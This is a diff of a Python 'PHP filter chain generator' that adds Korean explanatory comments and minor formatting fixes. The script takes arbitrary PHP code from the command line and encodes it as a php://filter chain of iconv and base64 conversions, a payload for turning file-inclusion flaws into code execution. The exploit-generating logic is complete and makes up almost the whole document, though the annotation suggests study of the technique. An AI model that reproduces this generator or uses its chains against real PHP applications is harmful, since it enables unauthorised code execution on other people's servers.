@@ -80,54 +80,64 @@ conversions = {
     '=': ''
 }
 
-def generate_filter_chain(chain, debug_base64 = False):
 
+# 실제 filter chain을 생성하는 함수
+def generate_filter_chain(chain, debug_base64=False):
     encoded_chain = chain
-    # generate some garbage base64
+
+    # 필터 체인을 정의할 문자열 시작 (초기 필터: base64 인코딩 등을 유도)
     filters = "convert.iconv.UTF8.CSISO2022KR|"
     filters += "convert.base64-encode|"
-    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file
-    filters += "convert.iconv.UTF8.UTF7|"
+    filters += "convert.iconv.UTF8.UTF7|"  # padding 제거
 
-
+    # base64 문자열을 역순으로 순회하며 각 문자에 대응하는 필터 체인 추가
     for c in encoded_chain[::-1]:
         filters += conversions[c] + "|"
-        # decode and reencode to get rid of everything that isn't valid base64
+        # base64 디코딩 후 다시 인코딩하여 불필요한 문자 제거
         filters += "convert.base64-decode|"
         filters += "convert.base64-encode|"
-        # get rid of equal signs
+        # padding 제거
         filters += "convert.iconv.UTF8.UTF7|"
+
+    # 디버깅이 아닐 경우 최종적으로 decode 처리
     if not debug_base64:
-        # don't add the decode while debugging chains
         filters += "convert.base64-decode"
 
+    # 최종 payload 형식으로 반환
     final_payload = f"php://filter/{filters}/resource={file_to_use}"
     return final_payload
 
+# 메인 함수
 def main():
-
-    # Parsing command line arguments
+    # 명령줄 인자 정의
     parser = argparse.ArgumentParser(description="PHP filter chain generator.")
-
-    parser.add_argument("--chain", help="Content you want to generate. (you will maybe need to pad with spaces for your payload to work)", required=False)
-    parser.add_argument("--rawbase64", help="The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.", required=False)
+    parser.add_argument("--chain", help="원하는 PHP 코드 입력 (공백으로 padding 필요할 수도 있음)", required=False)
+    parser.add_argument("--rawbase64", help="base64로 인코딩된 값을 직접 넣을 수 있음 (디버깅용)", required=False)
     args = parser.parse_args()
+
+    # --chain 옵션이 있는 경우
     if args.chain is not None:
+        # 입력된 PHP 코드를 base64 인코딩한 후 = 제거
         chain = args.chain.encode('utf-8')
         base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
+        # filter chain 생성
         chain = generate_filter_chain(base64_value)
         print("[+] The following gadget chain will generate the following code : {} (base64 value: {})".format(args.chain, base64_value))
         print(chain)
+
+    # --rawbase64 옵션이 있는 경우 (디버깅용)
     if args.rawbase64 is not None:
         rawbase64 = args.rawbase64.replace("=", "")
+        # base64 유효성 검사
         match = re.search("^([A-Za-z0-9+/])*$", rawbase64)
-        if (match):
+        if match:
             chain = generate_filter_chain(rawbase64, True)
             print(chain)
         else:
-            print ("[-] Base64 string required.")
+            print("[-] Base64 string required.")
             exit(1)
 
+# 프로그램 진입점
 if __name__ == "__main__":
     main()
 ```
